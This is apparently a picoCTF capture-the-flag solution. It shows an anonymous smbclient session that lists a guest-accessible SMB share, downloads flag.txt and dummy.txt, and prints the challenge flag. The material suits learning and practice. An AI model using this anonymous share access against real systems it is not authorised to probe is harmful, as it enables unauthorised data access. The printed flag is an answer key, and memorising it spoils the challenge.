```bash
$ smbclient //mysterious-sea.picoctf.net/shares -p 55470 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to mysterious-sea.picoctf.net failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar  7 03:25:40 2026
  ..                                  D        0  Sat Mar  7 03:25:40 2026
  dummy.txt                           N     1142  Thu Feb  5 04:22:17 2026
  flag.txt                            N       37  Sat Mar  7 03:25:40 2026

                65536 blocks of size 1024. 58676 blocks available
smb: \> get flag.txt
getting file \flag.txt of size 37 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get dummy.txt
getting file \dummy.txt of size 1142 as dummy.txt (1.0 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \>
```

FLAG: `picoCTF{5mb_pr1nter_5h4re5_ac4c227e}
`

